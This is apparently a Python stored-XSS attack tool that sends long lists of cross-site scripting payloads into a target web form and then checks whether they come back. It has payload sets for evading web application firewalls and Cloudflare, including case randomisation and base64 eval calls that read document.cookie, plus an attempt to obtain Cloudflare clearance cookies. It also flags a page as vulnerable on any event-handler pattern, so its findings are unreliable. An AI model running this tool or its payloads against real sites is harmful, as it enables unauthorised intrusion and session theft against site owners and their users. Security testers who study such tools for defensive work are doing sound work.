import requests
import urllib.parse
import time
import random
import re
from bs4 import BeautifulSoup

class StoredXSSScanner:
    def __init__(self):
        self.options = {
            "URL": "",
            "PARAM": "",
            "METHOD": "POST",
            "TIMEOUT": "10",
            "DELAY": "0",
            "COOKIE": "",
            "USER_AGENT": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "HEADERS": "",
            "CF_BYPASS": False,
            "WAF_BYPASS": False,
            "RANDOM_CASE": False,
            "RANDOM_SPACE": False,
            "COMMENT_BYPASS": False,
            "HEX_ENCODE": False,
            "URL_ENCODE": True,
            "CHECK_URL": "",
            "CHECK_DELAY": "5",
            "CHECK_METHOD": "GET",
            "CHECK_PARAM": ""
        }
        
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "'\"><img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<a href=javascript:alert('XSS')>Click</a>",
            "<a href=# onclick=alert('XSS')>Click</a>",
            "<form action=javascript:alert('XSS')><input type=submit></form>",
            "<isindex type=image src=1 onerror=alert('XSS')>",
            "<isindex action=javascript:alert('XSS') type=image>",
            "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
            "<meta http-equiv=refresh content=0;javascript:alert('XSS')>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            "<script>alert(document.cookie)</script>",
            "<script>alert(document.domain)</script>",
            "<img src=x onerror=alert(document.cookie)>",
            "<svg/onload=alert(document.cookie)>",
            "<body/onload=alert(document.cookie)>",
            "<input/onfocus=alert(document.cookie) autofocus>",
            "<select/onfocus=alert(document.cookie) autofocus>",
            "<textarea/onfocus=alert(document.cookie) autofocus>",
            "<keygen/onfocus=alert(document.cookie) autofocus>",
            "<video><source/onerror=alert(document.cookie)>",
            "<audio/src=x/onerror=alert(document.cookie)>",
            "<details/open/ontoggle=alert(document.cookie)>",
            "<marquee/onstart=alert(document.cookie)>",
            "'\"><script>alert(document.cookie)</script>",
            "'\"><img/src=x/onerror=alert(document.cookie)>",
            "javascript:alert(document.cookie)",
            "<iframe/src=javascript:alert(document.cookie)>",
            "<object/data=javascript:alert(document.cookie)>",
            "<embed/src=javascript:alert(document.cookie)>",
            "<a/href=javascript:alert(document.cookie)>Click</a>",
            "<a/href=#/onclick=alert(document.cookie)>Click</a>",
            "<form/action=javascript:alert(document.cookie)><input/type=submit></form>",
            "<isindex/type=image/src=1/onerror=alert(document.cookie)>",
            "<isindex/action=javascript:alert(document.cookie)/type=image>",
            "<meta/http-equiv=refresh/content=0;url=javascript:alert(document.cookie)>",
            "<meta/http-equiv=refresh/content=0;javascript:alert(document.cookie)>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
            "<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>",
            "<img/src=x/onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<body/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<input/onfocus=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')) autofocus>",
            "<select/onfocus=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')) autofocus>",
            "<textarea/onfocus=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')) autofocus>",
            "<keygen/onfocus=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')) autofocus>",
            "<video><source/onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<audio/src=x/onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<details/open/ontoggle=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<marquee/onstart=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "'\"><script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>",
            "'\"><img/src=x/onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))",
            "<iframe/src=javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<object/data=javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<embed/src=javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<a/href=javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>Click</a>",
            "<a/href=#/onclick=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>Click</a>",
            "<form/action=javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))><input/type=submit></form>",
            "<isindex/type=image/src=1/onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<isindex/action=javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))/type=image>",
            "<meta/http-equiv=refresh/content=0;url=javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<meta/http-equiv=refresh/content=0;javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>"
        ]
        
        self.waf_bypass_payloads = [
            "<ScRiPt>alert('XSS')</sCrIpT>",
            "<iMg sRc=x oNeRrOr=alert('XSS')>",
            "<sVg oNlOaD=alert('XSS')>",
            "<bOdY oNlOaD=alert('XSS')>",
            "<iNpUt oNfOcUs=alert('XSS') aUtOfOcUs>",
            "<sElEcT oNfOcUs=alert('XSS') aUtOfOcUs>",
            "<tExTaReA oNfOcUs=alert('XSS') aUtOfOcUs>",
            "<kEyGeN oNfOcUs=alert('XSS') aUtOfOcUs>",
            "<vIdEo><sOuRcE oNeRrOr=alert('XSS')>",
            "<aUdIo sRc=x oNeRrOr=alert('XSS')>",
            "<dEtAiLs oPeN oNtOgGlE=alert('XSS')>",
            "<mArQuEe oNsTaRt=alert('XSS')>",
            "'\"><ScRiPt>alert('XSS')</sCrIpT>",
            "'\"><iMg sRc=x oNeRrOr=alert('XSS')>",
            "jAvAsCrIpT:alert('XSS')",
            "<iFrAmE sRc=jAvAsCrIpT:alert('XSS')>",
            "<oBjEcT dAtA=jAvAsCrIpT:alert('XSS')>",
            "<eMbEd sRc=jAvAsCrIpT:alert('XSS')>",
            "<a hReF=jAvAsCrIpT:alert('XSS')>ClIcK</a>",
            "<a hReF=# oNcLiCk=alert('XSS')>ClIcK</a>",
            "<fOrM aCtIoN=jAvAsCrIpT:alert('XSS')><iNpUt tYpE=sUbMiT></fOrM>",
            "<iSInDeX tYpE=iMaGe sRc=1 oNeRrOr=alert('XSS')>",
            "<iSInDeX aCtIoN=jAvAsCrIpT:alert('XSS') tYpE=iMaGe>",
            "<mEtA hTtP-eQuIv=rEfReSh cOnTeNt=0;uRl=jAvAsCrIpT:alert('XSS')>",
            "<mEtA hTtP-eQuIv=rEfReSh cOnTeNt=0;jAvAsCrIpT:alert('XSS')>",
            "<ScRiPt>alert(String.fromCharCode(88,83,83))</sCrIpT>",
            "<ScRiPt>alert(/XSS/)</sCrIpT>",
            "<ScRiPt>alert(document.cookie)</sCrIpT>",
            "<ScRiPt>alert(document.domain)</sCrIpT>",
            "<iMg sRc=x oNeRrOr=alert(document.cookie)>",
            "<sVg/oNlOaD=alert(document.cookie)>",
            "<bOdY/oNlOaD=alert(document.cookie)>",
            "<iNpUt/oNfOcUs=alert(document.cookie) aUtOfOcUs>",
            "<sElEcT/oNfOcUs=alert(document.cookie) aUtOfOcUs>",
            "<tExTaReA/oNfOcUs=alert(document.cookie) aUtOfOcUs>",
            "<kEyGeN/oNfOcUs=alert(document.cookie) aUtOfOcUs>",
            "<vIdEo><sOuRcE/oNeRrOr=alert(document.cookie)>",
            "<aUdIo/sRc=x/oNeRrOr=alert(document.cookie)>",
            "<dEtAiLs/oPeN/oNtOgGlE=alert(document.cookie)>",
            "<mArQuEe/oNsTaRt=alert(document.cookie)>",
            "'\"><ScRiPt>alert(document.cookie)</sCrIpT>",
            "'\"><iMg/sRc=x/oNeRrOr=alert(document.cookie)>",
            "jAvAsCrIpT:alert(document.cookie)",
            "<iFrAmE/sRc=jAvAsCrIpT:alert(document.cookie)>",
            "<oBjEcT/dAtA=jAvAsCrIpT:alert(document.cookie)>",
            "<eMbEd/sRc=jAvAsCrIpT:alert(document.cookie)>",
            "<a/hReF=jAvAsCrIpT:alert(document.cookie)>ClIcK</a>",
            "<a/hReF=#/oNcLiCk=alert(document.cookie)>ClIcK</a>",
            "<fOrM/aCtIoN=jAvAsCrIpT:alert(document.cookie)><iNpUt/tYpE=sUbMiT></fOrM>",
            "<iSInDeX/tYpE=iMaGe/sRc=1/oNeRrOr=alert(document.cookie)>",
            "<iSInDeX/aCtIoN=jAvAsCrIpT:alert(document.cookie)/tYpE=iMaGe>",
            "<mEtA/hTtP-eQuIv=rEfReSh/cOnTeNt=0;uRl=jAvAsCrIpT:alert(document.cookie)>",
            "<mEtA/hTtP-eQuIv=rEfReSh/cOnTeNt=0;jAvAsCrIpT:alert(document.cookie)>",
            "<ScRiPt>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</sCrIpT>",
            "<ScRiPt>eval(atob('YWxlcnQoJ1hTUycp'))</sCrIpT>",
            "<ScRiPt>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</sCrIpT>",
            "<iMg/sRc=x/oNeRrOr=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<sVg/oNlOaD=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<bOdY/oNlOaD=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<iNpUt/oNfOcUs=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')) aUtOfOcUs>",
            "<sElEcT/oNfOcUs=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')) aUtOfOcUs>",
            "<tExTaReA/oNfOcUs=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')) aUtOfOcUs>",
            "<kEyGeN/oNfOcUs=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')) aUtOfOcUs>",
            "<vIdEo><sOuRcE/oNeRrOr=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<aUdIo/sRc=x/oNeRrOr=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<dEtAiLs/oPeN/oNtOgGlE=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<mArQuEe/oNsTaRt=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "'\"><ScRiPt>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</sCrIpT>",
            "'\"><iMg/sRc=x/oNeRrOr=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "jAvAsCrIpT:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))",
            "<iFrAmE/sRc=jAvAsCrIpT:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<oBjEcT/dAtA=jAvAsCrIpT:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<eMbEd/sRc=jAvAsCrIpT:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<a/hReF=jAvAsCrIpT:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>ClIcK</a>",
            "<a/hReF=#/oNcLiCk=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>ClIcK</a>",
            "<fOrM/aCtIoN=jAvAsCrIpT:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))><iNpUt/tYpE=sUbMiT></fOrM>",
            "<iSInDeX/tYpE=iMaGe/sRc=1/oNeRrOr=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<iSInDeX/aCtIoN=jAvAsCrIpT:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))/tYpE=iMaGe>",
            "<mEtA/hTtP-eQuIv=rEfReSh/cOnTeNt=0;uRl=jAvAsCrIpT:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<mEtA/hTtP-eQuIv=rEfReSh/cOnTeNt=0;jAvAsCrIpT:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>"
        ]
        
        self.cf_bypass_payloads = [
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "<svg onload=alert(String.fromCharCode(88,83,83))>",
            "<body onload=alert(String.fromCharCode(88,83,83))>",
            "<input onfocus=alert(String.fromCharCode(88,83,83)) autofocus>",
            "<select onfocus=alert(String.fromCharCode(88,83,83)) autofocus>",
            "<textarea onfocus=alert(String.fromCharCode(88,83,83)) autofocus>",
            "<keygen onfocus=alert(String.fromCharCode(88,83,83)) autofocus>",
            "<video><source onerror=alert(String.fromCharCode(88,83,83))>",
            "<audio src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "<details open ontoggle=alert(String.fromCharCode(88,83,83))>",
            "<marquee onstart=alert(String.fromCharCode(88,83,83))>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "'\"><img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "javascript:alert(String.fromCharCode(88,83,83))",
            "<iframe src=javascript:alert(String.fromCharCode(88,83,83))>",
            "<object data=javascript:alert(String.fromCharCode(88,83,83))>",
            "<embed src=javascript:alert(String.fromCharCode(88,83,83))>",
            "<a href=javascript:alert(String.fromCharCode(88,83,83))>Click</a>",
            "<a href=# onclick=alert(String.fromCharCode(88,83,83))>Click</a>",
            "<form action=javascript:alert(String.fromCharCode(88,83,83))><input type=submit></form>",
            "<isindex type=image src=1 onerror=alert(String.fromCharCode(88,83,83))>",
            "<isindex action=javascript:alert(String.fromCharCode(88,83,83)) type=image>",
            "<meta http-equiv=refresh content=0;url=javascript:alert(String.fromCharCode(88,83,83))>",
            "<meta http-equiv=refresh content=0;javascript:alert(String.fromCharCode(88,83,83))>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
            "<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>",
            "<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<body onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<input onfocus=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')) autofocus>",
            "<select onfocus=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')) autofocus>",
            "<textarea onfocus=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')) autofocus>",
            "<keygen onfocus=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')) autofocus>",
            "<video><source onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<audio src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<details open ontoggle=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<marquee onstart=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "'\"><script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>",
            "'\"><img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))",
            "<iframe src=javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<object data=javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<embed src=javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<a href=javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>Click</a>",
            "<a href=# onclick=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>Click</a>",
            "<form action=javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))><input type=submit></form>",
            "<isindex type=image src=1 onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<isindex action=javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')) type=image>",
            "<meta http-equiv=refresh content=0;url=javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            "<meta http-equiv=refresh content=0;javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>"
        ]
    
    def set_option(self, key, value):
        self.options[key] = value
    
    def get_option(self, key):
        return self.options[key]
    
    def process_payload(self, payload):
        if self.get_option("RANDOM_CASE"):
            payload = self.random_case(payload)
        
        if self.get_option("RANDOM_SPACE"):
            payload = self.random_space(payload)
        
        if self.get_option("COMMENT_BYPASS"):
            payload = self.comment_bypass(payload)
        
        if self.get_option("HEX_ENCODE"):
            payload = self.hex_encode(payload)
        
        if self.get_option("URL_ENCODE"):
            payload = urllib.parse.quote(payload)
        
        return payload
    
    def random_case(self, payload):
        return ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in payload)
    
    def random_space(self, payload):
        result = []
        for c in payload:
            result.append(c)
            if c == ' ' and random.random() > 0.5:
                result.append(random.choice([' ', '/**/', '%20', '+']))
        return ''.join(result)
    
    def comment_bypass(self, payload):
        return payload.replace(' ', '/**/')
    
    def hex_encode(self, payload):
        return '0x' + payload.encode('utf-8').hex()
    
    def get_cloudflare_cookies(self, url):
        try:
            session = requests.Session()
            response = session.get(url, timeout=int(self.get_option("TIMEOUT")), verify=False)
            
            if 'cf_clearance' in response.cookies:
                return {'cf_clearance': response.cookies.get('cf_clearance')}
            
            soup = BeautifulSoup(response.text, 'html.parser')
            js_challenge = soup.find('script', string=re.compile('setTimeout'))
            
            if js_challenge:
                time.sleep(5)
                response = session.get(url, timeout=int(self.get_option("TIMEOUT")), verify=False)
                if 'cf_clearance' in response.cookies:
                    return {'cf_clearance': response.cookies.get('cf_clearance')}
            
            return None
        except:
            return None
    
    def run(self):
        url = self.get_option("URL")
        param = self.get_option("PARAM")
        method = self.get_option("METHOD").upper()
        timeout = int(self.get_option("TIMEOUT"))
        delay = int(self.get_option("DELAY"))
        check_url = self.get_option("CHECK_URL") if self.get_option("CHECK_URL") else url
        check_delay = int(self.get_option("CHECK_DELAY"))
        check_method = self.get_option("CHECK_METHOD").upper()
        check_param = self.get_option("CHECK_PARAM")
        
        headers = {
            "User-Agent": self.get_option("USER_AGENT"),
            "Cookie": self.get_option("COOKIE")
        }
        
        if self.get_option("HEADERS"):
            try:
                for header in self.get_option("HEADERS").split("\\n"):
                    if ":" in header:
                        key, value = header.split(":", 1)
                        headers[key.strip()] = value.strip()
            except:
                pass
        
        cookies = {}
        
        if self.get_option("CF_BYPASS"):
            cf_cookies = self.get_cloudflare_cookies(url)
            if cf_cookies:
                cookies.update(cf_cookies)
        
        vulnerabilities = []
        
        payloads_to_test = self.payloads
        
        if self.get_option("WAF_BYPASS"):
            payloads_to_test = self.waf_bypass_payloads
        
        if self.get_option("CF_BYPASS"):
            payloads_to_test = self.cf_bypass_payloads
        
        for i, payload in enumerate(payloads_to_test, 1):
            if delay > 0:
                time.sleep(delay)
            
            processed_payload = self.process_payload(payload)
            
            vulnerable = self.test_payload(url, param, processed_payload, method, timeout, headers, cookies)
            
            if vulnerable:
                time.sleep(check_delay)
                
                if check_method == "GET":
                    if check_param:
                        check_url = f"{check_url}?{check_param}={urllib.parse.quote(processed_payload)}"
                    response = requests.get(check_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
                else:
                    if check_param:
                        data = {check_param: processed_payload}
                    else:
                        data = {param: processed_payload}
                    response = requests.post(check_url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
                
                if self.check_xss_in_response(response.text, processed_payload):
                    vulnerabilities.append({
                        "payload": payload,
                        "parameter": param
                    })
        
        if vulnerabilities:
            return {
                "success": True,
                "message": f"Found {len(vulnerabilities)} stored XSS vulnerabilities",
                "vulnerabilities": vulnerabilities
            }
        else:
            return {
                "success": True,
                "message": "No stored XSS vulnerabilities found"
            }
    
    def test_payload(self, url, param, payload, method, timeout, headers, cookies):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            
            return response.status_code == 200
        except:
            return False
    
    def check_xss_in_response(self, response_text, payload):
        xss_patterns = [
            r"<script[^>]*>.*?</script>",
            r"on\w+\s*=",
            r"javascript\s*:",
            r"<iframe[^>]*>.*?</iframe>",
            r"<object[^>]*>.*?</object>",
            r"<embed[^>]*>",
            r"<applet[^>]*>.*?</applet>",
            r"<meta[^>]*http-equiv[^>]*refresh[^>]*>",
            r"<form[^>]*action[^>]*javascript[^>]*>",
            r"<a[^>]*href[^>]*javascript[^>]*>",
            r"<img[^>]*onerror[^>]*>",
            r"<svg[^>]*onload[^>]*>",
            r"<body[^>]*onload[^>]*>",
            r"<input[^>]*onfocus[^>]*>",
            r"<select[^>]*onfocus[^>]*>",
            r"<textarea[^>]*onfocus[^>]*>",
            r"<keygen[^>]*onfocus[^>]*>",
            r"<video[^>]*>.*?<source[^>]*onerror[^>]*>",
            r"<audio[^>]*onerror[^>]*>",
            r"<details[^>]*ontoggle[^>]*>",
            r"<marquee[^>]*onstart[^>]*>"
        ]
        
        for pattern in xss_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        if payload in response_text:
            return True
        
        return False
